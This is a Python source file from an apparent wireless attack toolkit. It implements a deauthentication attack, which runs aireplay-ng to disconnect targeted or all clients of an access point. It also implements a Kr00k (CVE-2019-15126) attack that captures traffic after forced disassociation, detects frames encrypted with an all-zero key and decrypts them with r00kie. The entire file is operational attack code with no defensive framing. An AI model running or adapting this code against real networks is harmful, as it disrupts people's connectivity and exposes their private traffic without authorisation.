"""
Deauthentication and Kr00k attacks.
"""

import asyncio
import time
from datetime import datetime
from pathlib import Path
from typing import Callable, List, Optional

import structlog

from urban_hs.modules.wifi.attacks.base import AttackResult, AttackStatus, BaseAttack

logger = structlog.get_logger(__name__)


class DeauthAttack(BaseAttack):
    """
    Deauthentication Attack.

    Uses aireplay-ng to send deauthentication packets.
    Can target specific clients (targeted) or broadcast (all clients).
    """

    def __init__(
        self,
        interface: str,
        output_dir: Optional[str] = None,
        attack_timeout: int = 30,
    ):
        if output_dir is None:
            from urban_hs.core.config import get_config
            output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "deauth")
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
        **kwargs,
    ) -> AttackResult:
        client_mac = kwargs.get("client_mac")
        count = kwargs.get("count", 10)

        result = AttackResult(
            attack_type="deauth",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
            metadata={
                "client_mac": client_mac,
                "deauth_count": count,
                "targeted": client_mac is not None,
            },
        )

        try:
            self._log("Starting deauth attack", bssid=target_bssid, client=client_mac, count=count)
            self._notify_callback(callback, f"Sending {count} deauth packets to {client_mac or 'broadcast'}")

            cmd = [
                "aireplay-ng",
                "-0", str(count),
                "-a", target_bssid,
            ]

            if client_mac:
                cmd.extend(["-c", client_mac])

            if target_essid:
                cmd.extend(["-e", target_essid])

            cmd.append(self.interface)

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)

            result.finished_at = datetime.utcnow()
            result.output_files = []

            if proc.returncode == 0:
                result.status = AttackStatus.SUCCESS
                self._notify_callback(callback, f"Deauth sent successfully to {client_mac or 'all clients'}")
            else:
                result.status = AttackStatus.FAILED
                stderr_str = stderr.decode()
                result.error_message = stderr_str
                self._notify_callback(callback, f"Deauth failed: {stderr_str}")

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        return result


class Kr00kAttack(BaseAttack):
    """
    Kr00k Attack (CVE-2019-15126).

    Exploits Broadcom and Cypress WiFi chips that use an all-zero
    encryption key after disassociation.
    """

    def __init__(
        self,
        interface: str,
        output_dir: Optional[str] = None,
        attack_timeout: int = 60,
        deauth_count: int = 10,
        capture_after_deauth: int = 10,
    ):
        if output_dir is None:
            from urban_hs.core.config import get_config
            output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "kr00k")
        super().__init__(interface, output_dir, attack_timeout)
        self.deauth_count = deauth_count
        self.capture_after_deauth = capture_after_deauth
        self.deauth_attack = DeauthAttack(interface, attack_timeout=30)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
        **kwargs,
    ) -> AttackResult:
        client_mac = kwargs.get("client_mac")

        result = AttackResult(
            attack_type="kr00k",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
            metadata={
                "client_mac": client_mac,
                "deauth_count": self.deauth_count,
                "capture_duration": self.capture_after_deauth,
                "targeted_client": client_mac is not None,
            },
        )

        self._running = True

        timestamp = int(time.time())
        base_name = f"kr00k_{target_bssid.replace(':', '_')}_{timestamp}"
        cap_file = self.output_dir / f"{base_name}.cap"
        decrypted_dir = self.output_dir / f"{base_name}_decrypted"
        decrypted_dir.mkdir(parents=True, exist_ok=True)

        result.output_files = [str(cap_file), str(decrypted_dir)]

        try:
            self._log("Starting Kr00k attack", bssid=target_bssid, channel=channel)
            self._notify_callback(callback, f"Starting Kr00k attack on channel {channel}")

            airodump_proc = await self._start_airodump(
                bssid=target_bssid,
                channel=channel,
                output_prefix=str(self.output_dir / base_name),
            )

            await asyncio.sleep(2)

            self._log("Sending deauth packets for Kr00k", count=self.deauth_count)
            self._notify_callback(callback, f"Sending {self.deauth_count} deauth packets")

            deauth_result = await self.deauth_attack.execute(
                target_bssid=target_bssid,
                target_essid=target_essid,
                channel=channel,
                callback=callback,
                client_mac=client_mac,
                count=self.deauth_count,
            )

            if deauth_result.status != AttackStatus.SUCCESS:
                self._log("Deauth failed, continuing capture anyway")

            self._log("Capturing post-disassociation traffic", duration=self.capture_after_deauth)
            self._notify_callback(callback, f"Capturing for {self.capture_after_deauth}s after disassociation")

            await asyncio.sleep(self.capture_after_deauth)

            airodump_proc.terminate()
            try:
                await asyncio.wait_for(airodump_proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                airodump_proc.kill()
                await airodump_proc.wait()

            self._log("Analyzing capture for Kr00k vulnerability")
            kr00k_frames = await self._analyze_kr00k(cap_file)

            if kr00k_frames > 0:
                result.status = AttackStatus.SUCCESS
                result.metadata["kr00k_frames_found"] = kr00k_frames
                self._notify_callback(callback, f"Kr00k vulnerability confirmed: {kr00k_frames} frames")
            else:
                result.status = AttackStatus.FAILED
                result.metadata["kr00k_frames_found"] = 0
                self._notify_callback(callback, "No Kr00k vulnerable frames found")

            if kr00k_frames > 0:
                decrypted = await self._decrypt_kr00k(cap_file, decrypted_dir)
                if decrypted:
                    result.output_files.extend(decrypted)
                    result.metadata["decrypted_files"] = len(decrypted)

            result.finished_at = datetime.utcnow()

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
            self._log("Kr00k attack failed", error=str(e))
        finally:
            self._running = False

        return result

    async def _analyze_kr00k(self, cap_file: Path) -> int:
        """Analyze capture for frames encrypted with all-zero key."""
        if not cap_file.exists():
            return 0

        try:
            cmd = [
                "tshark", "-r", str(cap_file),
                "-Y", "wlan.fc.type == 2 and wlan_ccmp",
                "-T", "fields",
                "-e", "wlan.sa",
                "-e", "wlan.da",
                "-e", "wlan_ccmp.key",
                "-e", "frame.number",
            ]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            kr00k_count = 0
            output = stdout.decode()
            zero_key = "00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"

            for line in output.strip().split("\n"):
                if zero_key in line:
                    kr00k_count += 1

            return kr00k_count

        except Exception as e:
            self._log("Kr00k analysis failed", error=str(e))
            return 0

    async def _decrypt_kr00k(self, cap_file: Path, output_dir: Path) -> Optional[List[str]]:
        """Attempt to decrypt Kr00k frames using r00kie-kr00kie tool."""
        try:
            import shutil
            if not shutil.which("r00kie"):
                self._log("r00kie not available, skipping decryption")
                return None

            output_file = output_dir / "kr00k_decrypted.pcap"
            cmd = ["r00kie", "-i", str(cap_file), "-o", str(output_file)]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if proc.returncode == 0 and output_file.exists():
                self._log("Kr00k decryption successful", output_file=str(output_file))
                return [str(output_file)]

            return None

        except Exception as e:
            self._log("Kr00k decryption failed", error=str(e))
            return None
